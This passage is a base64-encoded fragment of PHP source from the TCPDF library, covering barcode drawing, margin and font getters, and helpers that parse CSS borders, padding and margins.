gkJCQkkeHBvcyA9ICgkdGhpcy0+dyArICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW4gLSAkdykgLyAyOwoJCQl9IGVsc2VpZiAoJHN0eWxlWydwb3NpdGlvbiddID09ICdSJykgewoJCQkJJHhwb3MgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeHBvcyA9ICR4IC0gJHc7CgkJCX0KCQkJJHRoaXMtPmltZ19yYl94ID0gJHhwb3M7CgkJfSBlbHNlIHsKCQkJaWYgKCRzdHlsZVsncG9zaXRpb24nXSA9PSAnTCcpIHsKCQkJCSR4cG9zID0gJHRoaXMtPmxNYXJnaW47CgkJCX0gZWxzZWlmICgkc3R5bGVbJ3Bvc2l0aW9uJ10gPT0gJ0MnKSB7CgkJCQkkeHBvcyA9ICgkdGhpcy0+dyArICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW4gLSAkdykgLyAyOwoJCQl9IGVsc2VpZiAoJHN0eWxlWydwb3NpdGlvbiddID09ICdSJykgewoJCQkJJHhwb3MgPSAkdGhpcy0+dyAtICR0aGlzLT5yTWFyZ2luIC0gJHc7CgkJCX0gZWxzZSB7CgkJCQkkeHBvcyA9ICR4OwoJCQl9CgkJCSR0aGlzLT5pbWdfcmJfeCA9ICR4cG9zICsgJHc7CgkJfQoJCSR4c3RhcnQgPSAkeHBvcyArICgkc3R5bGVbJ2hwYWRkaW5nJ10gKiAkY3cpOwoJCSR5c3RhcnQgPSAkeSArICgkc3R5bGVbJ3ZwYWRkaW5nJ10gKiAkY2gpOwoJCS8vIGJhcmNvZGUgaXMgYWx3YXlzIHByaW50ZWQgaW4gTFRSIGRpcmVjdGlvbgoJCSR0ZW1wUlRMID0gJHRoaXMtPnJ0bDsKCQkkdGhpcy0+cnRsID0gZmFsc2U7CgkJLy8gcHJpbnQgYmFja2dyb3VuZCBjb2xvcgoJCWlmICgkc3R5bGVbJ2JnY29sb3InXSkgewoJCQkkdGhpcy0+UmVjdCgkeHBvcywgJHksICR3LCAkaCwgJHN0eWxlWydib3JkZXInXSA/ICdERicgOiAnRicsICcnLCAkc3R5bGVbJ2JnY29sb3InXSk7CgkJfSBlbHNlaWYgKCRzdHlsZVsnYm9yZGVyJ10pIHsKCQkJJHRoaXMtPlJlY3QoJHhwb3MsICR5LCAkdywgJGgsICdEJyk7CgkJfQoJCS8vIHNldCBmb3JlZ3JvdW5kIGNvbG9yCgkJJHRoaXMtPnNldERyYXdDb2xvckFycmF5KCRzdHlsZVsnZmdjb2xvciddKTsKCQkvLyBwcmludCBiYXJjb2RlIGNlbGxzCgkJLy8gZm9yIGVhY2ggcm93CgkJZm9yICgkciA9IDA7ICRyIDwgJHJvd3M7ICsrJHIpIHsKCQkJJHhyID0gJHhzdGFydDsKCQkJLy8gZm9yIGVhY2ggY29sdW1uCgkJCWZvciAoJGMgPSAwOyAkYyA8ICRjb2xzOyArKyRjKSB7CgkJCQlpZiAoJGFycmNvZGVbJ2Jjb2RlJ11bJHJdWyRjXSA9PSAxKSB7CgkJCQkJLy8gZHJhdyBhIHNpbmdsZSBiYXJjb2RlIGNlbGwKCQkJCQkkdGhpcy0+UmVjdCgkeHIsICR5c3RhcnQsICRjdywgJGNoLCAnRicsIGFycmF5KCksICRzdHlsZVsnZmdjb2xvciddKTsKCQkJCX0KCQkJCSR4ciArPSAkY3c7CgkJCX0KCQkJJHlzdGFydCArPSAkY2g7CgkJfQoJCS8vIHJlc3RvcmUgb3JpZ2luYWwgZGlyZWN0aW9uCgkJJHRoaXMtPnJ0bCA9ICR0ZW1wUlRMOwoJCS8vIHJlc3RvcmUgcHJldmlvdXMgc2V0dGluZ3MKCQkkdGhpcy0+c2V0R3JhcGhpY1ZhcnMoJGd2YXJzKTsKCQkvLyBzZXQgcG9pbnRlciB0byBhbGlnbiB0aGUgbmV4dCB0ZXh0L29iamVjdHMKCQlzd2l0Y2goJGFsaWduKSB7CgkJCWNhc2UgJ1QnOnsKCQkJCSR0aGlzLT55ID0gJHk7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ00nOnsKCQkJCSR0aGlzLT55ID0gJHkgKyByb3VuZCgkaC8yKTsKCQkJCSR0aGlzLT54ID0gJHRoaXMtPmltZ19yYl94OwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAnQic6ewoJCQkJJHRoaXMtPnkgPSAkdGhpcy0+aW1nX3JiX3k7CgkJCQkkdGhpcy0+eCA9ICR0aGlzLT5pbWdfcmJfeDsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgJ04nOnsKCQkJCSR0aGlzLT5zZXRZKCR0aGlzLT5pbWdfcmJfeSk7CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OnsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5lbmRsaW5leCA9ICR0aGlzLT5pbWdfcmJfeDsKCX0KCgkvKioKCSAqIFJldHVybnMgYW4gYXJyYXkgY29udGFpbmluZyBjdXJyZW50IG1hcmdpbnM6CgkgKiA8dWw+CgkJCTxsaT4kcmV0WydsZWZ0J10gPSBsZWZ0IG1hcmdpbjwvbGk+CgkJCTxsaT4kcmV0WydyaWdodCddID0gcmlnaHQgbWFyZ2luPC9saT4KCQkJPGxpPiRyZXRbJ3RvcCddID0gdG9wIG1hcmdpbjwvbGk+CgkJCTxsaT4kcmV0Wydib3R0b20nXSA9IGJvdHRvbSBtYXJnaW48L2xpPgoJCQk8bGk+JHJldFsnaGVhZGVyJ10gPSBoZWFkZXIgbWFyZ2luPC9saT4KCQkJPGxpPiRyZXRbJ2Zvb3RlciddID0gZm9vdGVyIG1hcmdpbjwvbGk+CgkJCTxsaT4kcmV0WydjZWxsJ10gPSBjZWxsIHBhZGRpbmcgYXJyYXk8L2xpPgoJCQk8bGk+JHJldFsncGFkZGluZ19sZWZ0J10gPSBjZWxsIGxlZnQgcGFkZGluZzwvbGk+CgkJCTxsaT4kcmV0WydwYWRkaW5nX3RvcCddID0gY2VsbCB0b3AgcGFkZGluZzwvbGk+CgkJCTxsaT4kcmV0WydwYWRkaW5nX3JpZ2h0J10gPSBjZWxsIHJpZ2h0IHBhZGRpbmc8L2xpPgoJCQk8bGk+JHJldFsncGFkZGluZ19ib3R0b20nXSA9IGNlbGwgYm90dG9tIHBhZGRpbmc8L2xpPgoJICogPC91bD4KCSAqIEByZXR1cm4gYXJyYXkgY29udGFpbmluZyBhbGwgbWFyZ2lucyBtZWFzdXJlcwoJICogQHB1YmxpYwoJICogQHNpbmNlIDMuMi4wMDAgKDIwMDgtMDYtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRNYXJnaW5zKCkgewoJCSRyZXQgPSBhcnJheSgKCQkJJ2xlZnQnID0+ICR0aGlzLT5sTWFyZ2luLAoJCQkncmlnaHQnID0+ICR0aGlzLT5yTWFyZ2luLAoJCQkndG9wJyA9PiAkdGhpcy0+dE1hcmdpbiwKCQkJJ2JvdHRvbScgPT4gJHRoaXMtPmJNYXJnaW4sCgkJCSdoZWFkZXInID0+ICR0aGlzLT5oZWFkZXJfbWFyZ2luLAoJCQknZm9vdGVyJyA9PiAkdGhpcy0+Zm9vdGVyX21hcmdpbiwKCQkJJ2NlbGwnID0+ICR0aGlzLT5jZWxsX3BhZGRpbmcsCgkJCSdwYWRkaW5nX2xlZnQnID0+ICR0aGlzLT5jZWxsX3BhZGRpbmdbJ0wnXSwKCQkJJ3BhZGRpbmdfdG9wJyA9PiAkdGhpcy0+Y2VsbF9wYWRkaW5nWydUJ10sCgkJCSdwYWRkaW5nX3JpZ2h0JyA9PiAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ10sCgkJCSdwYWRkaW5nX2JvdHRvbScgPT4gJHRoaXMtPmNlbGxfcGFkZGluZ1snQiddCgkJKTsKCQlyZXR1cm4gJHJldDsKCX0KCgkvKioKCSAqIFJldHVybnMgYW4gYXJyYXkgY29udGFpbmluZyBvcmlnaW5hbCBtYXJnaW5zOgoJICogPHVsPgoJCQk8bGk+JHJldFsnbGVmdCddID0gbGVmdCBtYXJnaW48L2xpPgoJCQk8bGk+JHJldFsncmlnaHQnXSA9IHJpZ2h0IG1hcmdpbjwvbGk+CgkgKiA8L3VsPgoJICogQHJldHVybiBhcnJheSBjb250YWluaW5nIGFsbCBtYXJnaW5zIG1lYXN1cmVzCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC4wLjAxMiAoMjAwOC0wNy0yNCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldE9yaWdpbmFsTWFyZ2lucygpIHsKCQkkcmV0ID0gYXJyYXkoCgkJCSdsZWZ0JyA9PiAkdGhpcy0+b3JpZ2luYWxfbE1hcmdpbiwKCQkJJ3JpZ2h0JyA9PiAkdGhpcy0+b3JpZ2luYWxfck1hcmdpbgoJCSk7CgkJcmV0dXJuICRyZXQ7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBjdXJyZW50IGZvbnQgc2l6ZS4KCSAqIEByZXR1cm4gZmxvYXQgY3VycmVudCBmb250IHNpemUKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjIuMDAwICgyMDA4LTA2LTIzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udFNpemUoKSB7CgkJcmV0dXJuICR0aGlzLT5Gb250U2l6ZTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGN1cnJlbnQgZm9udCBzaXplIGluIHBvaW50cyB1bml0LgoJICogQHJldHVybiBpbnQgY3VycmVudCBmb250IHNpemUgaW4gcG9pbnRzIHVuaXQKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjIuMDAwICgyMDA4LTA2LTIzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udFNpemVQdCgpIHsKCQlyZXR1cm4gJHRoaXMtPkZvbnRTaXplUHQ7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBjdXJyZW50IGZvbnQgZmFtaWx5IG5hbWUuCgkgKiBAcmV0dXJuIHN0cmluZyBjdXJyZW50IGZvbnQgZmFtaWx5IG5hbWUKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjMuMDA4ICgyMDA4LTEyLTA1KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udEZhbWlseSgpIHsKCQlyZXR1cm4gJHRoaXMtPkZvbnRGYW1pbHk7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBjdXJyZW50IGZvbnQgc3R5bGUuCgkgKiBAcmV0dXJuIHN0cmluZyBjdXJyZW50IGZvbnQgc3R5bGUKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjMuMDA4ICgyMDA4LTEyLTA1KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udFN0eWxlKCkgewoJCXJldHVybiAkdGhpcy0+Rm9udFN0eWxlOwoJfQoKCS8qKgoJICogQ2xlYW51cCBIVE1MIGNvZGUgKHJlcXVpcmVzIEhUTUwgVGlkeSBsaWJyYXJ5KS4KCSAqIEBwYXJhbSBzdHJpbmcgJGh0bWwgaHRtbGNvZGUgdG8gZml4CgkgKiBAcGFyYW0gc3RyaW5nICRkZWZhdWx0X2NzcyBDU1MgY29tbWFuZHMgdG8gYWRkCgkgKiBAcGFyYW0gYXJyYXl8bnVsbCAkdGFndnMgcGFyYW1ldGVycyBmb3Igc2V0SHRtbFZTcGFjZSBtZXRob2QKCSAqIEBwYXJhbSBhcnJheXxudWxsICR0aWR5X29wdGlvbnMgb3B0aW9ucyBmb3IgdGlkeV9wYXJzZV9zdHJpbmcgZnVuY3Rpb24KCSAqIEByZXR1cm4gc3RyaW5nIFhIVE1MIGNvZGUgY2xlYW5lZCB1cAoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDE3ICgyMDEwLTExLTE2KQoJICogQHNlZSBzZXRIdG1sVlNwYWNlKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGZpeEhUTUxDb2RlKCRodG1sLCAkZGVmYXVsdF9jc3M9JycsICR0YWd2cz1udWxsLCAkdGlkeV9vcHRpb25zPW51bGwpIHsKCQlyZXR1cm4gVENQREZfU1RBVElDOjpmaXhIVE1MQ29kZSgkaHRtbCwgJGRlZmF1bHRfY3NzLCAkdGFndnMsICR0aWR5X29wdGlvbnMsICR0aGlzLT50YWd2c3BhY2VzKTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGJvcmRlciB3aWR0aCBmcm9tIENTUyBwcm9wZXJ0eQoJICogQHBhcmFtIHN0cmluZyAkd2lkdGggYm9yZGVyIHdpZHRoCgkgKiBAcmV0dXJuIGludCB3aXRoIGluIHVzZXIgdW5pdHMKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjcuMDAwICgyMDEwLTA4LTAyKQoJICovCglwcm90ZWN0ZWQgZnVuY3Rpb24gZ2V0Q1NTQm9yZGVyV2lkdGgoJHdpZHRoKSB7CgkJaWYgKCR3aWR0aCA9PSAndGhpbicpIHsKCQkJJHdpZHRoID0gKDIgLyAkdGhpcy0+ayk7CgkJfSBlbHNlaWYgKCR3aWR0aCA9PSAnbWVkaXVtJykgewoJCQkkd2lkdGggPSAoNCAvICR0aGlzLT5rKTsKCQl9IGVsc2VpZiAoJHdpZHRoID09ICd0aGljaycpIHsKCQkJJHdpZHRoID0gKDYgLyAkdGhpcy0+ayk7CgkJfSBlbHNlIHsKCQkJJHdpZHRoID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkd2lkdGgsIDEsICdweCcsIGZhbHNlKTsKCQl9CgkJcmV0dXJuICR3aWR0aDsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGJvcmRlciBkYXNoIHN0eWxlIGZyb20gQ1NTIHByb3BlcnR5CgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBib3JkZXIgc3R5bGUgdG8gY29udmVydAoJICogQHJldHVybiBpbnQgc2FzaCBzdHlsZSAocmV0dXJuIC0xIGluIGNhc2Ugb2Ygbm9uZSBvciBoaWRkZW4gYm9yZGVyKQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuNy4wMDAgKDIwMTAtMDgtMDIpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBnZXRDU1NCb3JkZXJEYXNoU3R5bGUoJHN0eWxlKSB7CgkJc3dpdGNoIChzdHJ0b2xvd2VyKCRzdHlsZSkpIHsKCQkJY2FzZSAnbm9uZSc6CgkJCWNhc2UgJ2hpZGRlbic6IHsKCQkJCSRkYXNoID0gLTE7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdkb3R0ZWQnOiB7CgkJCQkkZGFzaCA9IDE7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdkYXNoZWQnOiB7CgkJCQkkZGFzaCA9IDM7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlICdkb3VibGUnOgoJCQljYXNlICdncm9vdmUnOgoJCQljYXNlICdyaWRnZSc6CgkJCWNhc2UgJ2luc2V0JzoKCQkJY2FzZSAnb3V0c2V0JzoKCQkJY2FzZSAnc29saWQnOgoJCQlkZWZhdWx0OiB7CgkJCQkkZGFzaCA9IDA7CgkJCQlicmVhazsKCQkJfQoJCX0KCQlyZXR1cm4gJGRhc2g7Cgl9CgoJLyoqCgkgKiBSZXR1cm5zIHRoZSBib3JkZXIgc3R5bGUgYXJyYXkgZnJvbSBDU1MgYm9yZGVyIHByb3BlcnRpZXMKCSAqIEBwYXJhbSBzdHJpbmcgJGNzc2JvcmRlciBib3JkZXIgcHJvcGVydGllcwoJICogQHJldHVybiBhcnJheSBjb250YWluaW5nIGJvcmRlciBwcm9wZXJ0aWVzCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS43LjAwMCAoMjAxMC0wOC0wMikKCSAqLwoJcHJvdGVjdGVkIGZ1bmN0aW9uIGdldENTU0JvcmRlclN0eWxlKCRjc3Nib3JkZXIpIHsKCQkkYnByb3AgPSBwcmVnX3NwbGl0KCcvW1xzXSsvJywgdHJpbSgkY3NzYm9yZGVyKSk7CgkJJGNvdW50ID0gY291bnQoJGJwcm9wKTsKCQlpZiAoJGNvdW50ID4gMCAmJiAkYnByb3BbJGNvdW50IC0gMV0gPT09ICchaW1wb3J0YW50JykgewoJCQl1bnNldCgkYnByb3BbJGNvdW50IC0gMV0pOwoJCQktLSRjb3VudDsKCQl9CgoJCSRib3JkZXIgPSBhcnJheSgpOyAvLyB2YWx1ZSB0byBiZSByZXR1cm5lZAoJCXN3aXRjaCAoJGNvdW50KSB7CgkJCWNhc2UgMjogewoJCQkJJHdpZHRoID0gJ21lZGl1bSc7CgkJCQkkc3R5bGUgPSAkYnByb3BbMF07CgkJCQkkY29sb3IgPSAkYnByb3BbMV07CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDE6IHsKCQkJCSR3aWR0aCA9ICdtZWRpdW0nOwoJCQkJJHN0eWxlID0gJGJwcm9wWzBdOwoJCQkJJGNvbG9yID0gJ2JsYWNrJzsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgMDogewoJCQkJJHdpZHRoID0gJ21lZGl1bSc7CgkJCQkkc3R5bGUgPSAnc29saWQnOwoJCQkJJGNvbG9yID0gJ2JsYWNrJzsKCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6IHsKCQkJCSR3aWR0aCA9ICRicHJvcFswXTsKCQkJCSRzdHlsZSA9ICRicHJvcFsxXTsKCQkJCSRjb2xvciA9ICRicHJvcFsyXTsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCWlmICgkc3R5bGUgPT0gJ25vbmUnKSB7CgkJCXJldHVybiBhcnJheSgpOwoJCX0KCQkkYm9yZGVyWydjYXAnXSA9ICdzcXVhcmUnOwoJCSRib3JkZXJbJ2pvaW4nXSA9ICdtaXRlcic7CgkJJGJvcmRlclsnZGFzaCddID0gJHRoaXMtPmdldENTU0JvcmRlckRhc2hTdHlsZSgkc3R5bGUpOwoJCWlmICgkYm9yZGVyWydkYXNoJ10gPCAwKSB7CgkJCXJldHVybiBhcnJheSgpOwoJCX0KCQkkYm9yZGVyWyd3aWR0aCddID0gJHRoaXMtPmdldENTU0JvcmRlcldpZHRoKCR3aWR0aCk7CgkJJGJvcmRlclsnY29sb3InXSA9IFRDUERGX0NPTE9SUzo6Y29udmVydEhUTUxDb2xvclRvRGVjKCRjb2xvciwgJHRoaXMtPnNwb3RfY29sb3JzKTsKCQlyZXR1cm4gJGJvcmRlcjsKCX0KCgkvKioKCSAqIEdldCB0aGUgaW50ZXJuYWwgQ2VsbCBwYWRkaW5nIGZyb20gQ1NTIGF0dHJpYnV0ZS4KCSAqIEBwYXJhbSBzdHJpbmcgJGNzc3BhZGRpbmcgcGFkZGluZyBwcm9wZXJ0aWVzCgkgKiBAcGFyYW0gZmxvYXQgJHdpZHRoIHdpZHRoIG9mIHRoZSBjb250YWluaW5nIGVsZW1lbnQKCSAqIEByZXR1cm4gYXJyYXkgb2YgY2VsbCBwYWRkaW5ncwoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4wMDAgKDIwMTAtMTAtMDQpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRDU1NQYWRkaW5nKCRjc3NwYWRkaW5nLCAkd2lkdGg9MCkgewoJCSRwYWRkaW5nID0gcHJlZ19zcGxpdCgnL1tcc10rLycsIHRyaW0oJGNzc3BhZGRpbmcpKTsKCQkkY2VsbF9wYWRkaW5nID0gYXJyYXkoKTsgLy8gdmFsdWUgdG8gYmUgcmV0dXJuZWQKCQlzd2l0Y2ggKGNvdW50KCRwYWRkaW5nKSkgewoJCQljYXNlIDQ6IHsKCQkJCSRjZWxsX3BhZGRpbmdbJ1QnXSA9ICRwYWRkaW5nWzBdOwoJCQkJJGNlbGxfcGFkZGluZ1snUiddID0gJHBhZGRpbmdbMV07CgkJCQkkY2VsbF9wYWRkaW5nWydCJ10gPSAkcGFkZGluZ1syXTsKCQkJCSRjZWxsX3BhZGRpbmdbJ0wnXSA9ICRwYWRkaW5nWzNdOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAzOiB7CgkJCQkkY2VsbF9wYWRkaW5nWydUJ10gPSAkcGFkZGluZ1swXTsKCQkJCSRjZWxsX3BhZGRpbmdbJ1InXSA9ICRwYWRkaW5nWzFdOwoJCQkJJGNlbGxfcGFkZGluZ1snQiddID0gJHBhZGRpbmdbMl07CgkJCQkkY2VsbF9wYWRkaW5nWydMJ10gPSAkcGFkZGluZ1sxXTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgMjogewoJCQkJJGNlbGxfcGFkZGluZ1snVCddID0gJHBhZGRpbmdbMF07CgkJCQkkY2VsbF9wYWRkaW5nWydSJ10gPSAkcGFkZGluZ1sxXTsKCQkJCSRjZWxsX3BhZGRpbmdbJ0InXSA9ICRwYWRkaW5nWzBdOwoJCQkJJGNlbGxfcGFkZGluZ1snTCddID0gJHBhZGRpbmdbMV07CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDE6IHsKCQkJCSRjZWxsX3BhZGRpbmdbJ1QnXSA9ICRwYWRkaW5nWzBdOwoJCQkJJGNlbGxfcGFkZGluZ1snUiddID0gJHBhZGRpbmdbMF07CgkJCQkkY2VsbF9wYWRkaW5nWydCJ10gPSAkcGFkZGluZ1swXTsKCQkJCSRjZWxsX3BhZGRpbmdbJ0wnXSA9ICRwYWRkaW5nWzBdOwoJCQkJYnJlYWs7CgkJCX0KCQkJZGVmYXVsdDogewoJCQkJcmV0dXJuICR0aGlzLT5jZWxsX3BhZGRpbmc7CgkJCX0KCQl9CgkJaWYgKCR3aWR0aCA9PSAwKSB7CgkJCSR3aWR0aCA9ICR0aGlzLT53IC0gJHRoaXMtPmxNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbjsKCQl9CgkJJGNlbGxfcGFkZGluZ1snVCddID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkY2VsbF9wYWRkaW5nWydUJ10sICR3aWR0aCwgJ3B4JywgZmFsc2UpOwoJCSRjZWxsX3BhZGRpbmdbJ1InXSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoJGNlbGxfcGFkZGluZ1snUiddLCAkd2lkdGgsICdweCcsIGZhbHNlKTsKCQkkY2VsbF9wYWRkaW5nWydCJ10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKCRjZWxsX3BhZGRpbmdbJ0InXSwgJHdpZHRoLCAncHgnLCBmYWxzZSk7CgkJJGNlbGxfcGFkZGluZ1snTCddID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cygkY2VsbF9wYWRkaW5nWydMJ10sICR3aWR0aCwgJ3B4JywgZmFsc2UpOwoJCXJldHVybiAkY2VsbF9wYWRkaW5nOwoJfQoKCS8qKgoJICogR2V0IHRoZSBpbnRlcm5hbCBDZWxsIG1hcmdpbiBmcm9tIENTUyBhdHRyaWJ1dGUuCgkgKiBAcGFyYW0gc3RyaW5nICRjc3NtYXJnaW4gbWFyZ2luIHByb3BlcnRpZXMKCSAqIEBwYXJhbSBmbG9hdCAkd2lkdGggd2lkdGggb2YgdGhlIGNvbnRhaW5pbmcgZWxlbWVudAoJICogQHJldHVybiBhcnJheSBvZiBjZWxsIG1hcmdpbnMKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDAwICgyMDEwLTEwLTA0KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q1NTTWFyZ2luKCRjc3NtYXJnaW4sICR3aWR0aD0wKSB7CgkJJG1hcmdpbiA9IHByZWdfc3BsaXQoJy9bXHNdKy8nLCB0cmltKCRjc3NtYXJnaW4pKTsKCQkkY2VsbF9tYXJnaW4gPSBhcnJheSgpOyAvLyB2YWx1ZSB0byBiZSByZXR1cm5lZAoJCXN3aXRjaCAoY291bnQoJG1hcmdpbikpIHsKCQkJY2FzZSA0OiB7CgkJCQkkY2VsbF9tYXJnaW5bJ1QnXSA9ICRtYXJnaW5bMF07CgkJCQkkY2VsbF9tYXJnaW5bJ1InXSA9ICRtYXJnaW5bMV07CgkJCQkkY2VsbF9tYXJnaW5bJ0InXSA9ICRtYXJnaW5bMl07CgkJCQkkY2VsbF9tYXJnaW5bJ0wnXSA9ICRtYXJnaW5bM107CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDM6IHsKCQkJCSRjZWxsX21hcmdpblsnVCddID0gJG1hcmdpblswXTsKCQkJCSRjZWxsX21hcmdpblsnUiddID0gJG1hcmdpblsxXTsKCQkJCSRjZWxsX21hcmdpblsnQiddID0gJG1hcmdpblsyXTsKCQkJCSRjZWxsX21hcmdpblsnTCddID0gJG1hcmdpblsxXTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgMjogewoJCQkJJGNlbGxfbWFyZ2luWydUJ10gPSAkbWFyZ2luWzBdOwoJCQkJJGNlbGxfbWFyZ2luWydSJ10gPSAkbWFyZ2luWzFdOwoJCQkJJGNlbGxfbWFyZ2luWydCJ10gPSAkbWFyZ2luWzBdOwoJCQkJJGNlbGxfbWFyZ2luWydMJ10gPSAkbWFyZ2luWzFdOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAxOiB7CgkJCQkkY2VsbF9tYXJnaW5bJ1QnXSA9ICRtYXJnaW5bMF07CgkJCQkkY2VsbF9tYXJnaW5bJ1InXSA9ICRtYXJnaW5bMF07CgkJCQkkY2VsbF9tYXJnaW5bJ0InXSA9ICRtYXJnaW5bMF07CgkJCQkkY2VsbF9tYXJnaW5bJ0wnXSA9ICRtYXJnaW5bMF07CgkJCQlicmVhazsKCQkJfQoJCQlkZWZhdWx0OiB7CgkJCQlyZXR1cm4gJHRoaXMtPmNlbGxfbWFyZ2luOwoJCQl9CgkJfQoJCWlmICgkd2lkdGggPT0gMCkgewoJCQkkd2lkdGggPSAkdGhpcy0+dyAtICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW47CgkJfQoJCSRjZWxsX21hcmdpblsnVCddID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cyhzdHJfcmVwbGFjZSgnYXV0bycsICcwJywgJGNlbGxfbWFyZ2luWydUJ10pLCAkd2lkdGgsICdweCcsIGZhbHNlKTsKCQkkY2VsbF9tYXJnaW5bJ1InXSA9ICR0aGlzLT5nZXRIVE1MVW5pdFRvVW5pdHMoc3RyX3JlcGxhY2UoJ2F1dG8nLCAnMCcsICRjZWxsX21hcmdpblsnUiddKSwgJHdpZHRoLCAncHgnLCBmYWxzZSk7CgkJJGNlbGxfbWFyZ2luWydCJ10gPSAkdGhpcy0+Z2V0SFRNTFVuaXRUb1VuaXRzKHN0cl9yZXBsYWNlKCdhdXRvJywgJzAnLCAkY2VsbF9tYXJnaW5bJ0InXSksICR3aWR0aCwgJ3B4JywgZmFsc2UpOwoJCSRjZWxsX21hcmdpblsnTCddID0gJHRoaXMtPmdldEhUTUxVbml0VG9Vbml0cyhzdHJfcmVwbGFjZSgnYXV0bycsICcwJywgJGNlbGxfbWFyZ2luWydMJ10pLCAkd2lkdGgsICdweCcsIGZhbHNlKTsKCQlyZXR1cm4gJGNlbGxfbWFyZ2luOwoJfQoKCS8qKgoJICogR2V0IHRoZSBib3JkZXItc3BhY2luZyBmcm9tIENTUyBhdHRyaWJ1dGUuCgkgKiBAcGFyYW0gc3RyaW5nICRjc3Nic3BhY2UgYm9yZGVyLXNwYWNpbmcgQ1NTIHByb3BlcnRpZXMKCSAqIEBwYXJhbSBmbG9hdCAkd2lkdGggd2lkdGggb2YgdGhlIGNvbnRhaW5pbmcgZWxlbWVudAoJICogQHJldHVybiBhcnJheSBvZiBib3JkZXIgc3BhY2luZ3MKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMDEwICgyMDEwLTEwLTI3KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q1NTQm9yZGVyTWFyZ2luKCRjc3Nic3BhY2UsICR3aWR0aD0wKSB7CgkJJHNwYWNlID0gcHJlZ19zcGxpdCgnL1tcc10rLycsIHRyaW0oJGNzc2JzcGFjZSkpOwoJCSRib3JkZXJfc3BhY2luZyA9IGFycmF5KCk7IC8vIHZhbHVlIHRvIGJlIHJldHVybmVkCgkJc3dpdGNoIChjb3VudCgkc3BhY2UpKSB7CgkJCWNhc2UgMjogewoJCQkJJGJvcmRlcl9zcGFjaW5nWydIJ10gPSAkc3BhY2VbMF07CgkJCQkkYm9yZGVyX3NwYWNpbmdbJ1YnXSA9ICRzcGFjZVsxXTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgMTogewoJCQkJJGJvcmRlcl9zcGFjaW5nWydIJ10gPSAkc3BhY2VbMF07CgkJCQkkYm9yZGVyX3NwYWNpbmdbJ1YnXSA9ICRzcGFjZVswXTsKCQkJCWJyZWFrOwoJCQl9CgkJCWRlZmF1bHQ6IHsKCQkJCXJldHVybiBhcnJheSgnSCcgPT4gMCwgJ1YnID0+IDApOwoJCQl9CgkJfQoJCWlmICgkd2lkdGggPT0gMCkgewoJCQkkd2lkdGggPSAkdGhpcy0+dyAtICR0aGlzLT5sTWFyZ2luIC0gJHRoaXMtPnJNYXJnaW47CgkJfQoJCSRib3JkZXJfc3BhY2luZ1snSCddID0gJHRoaXMtPm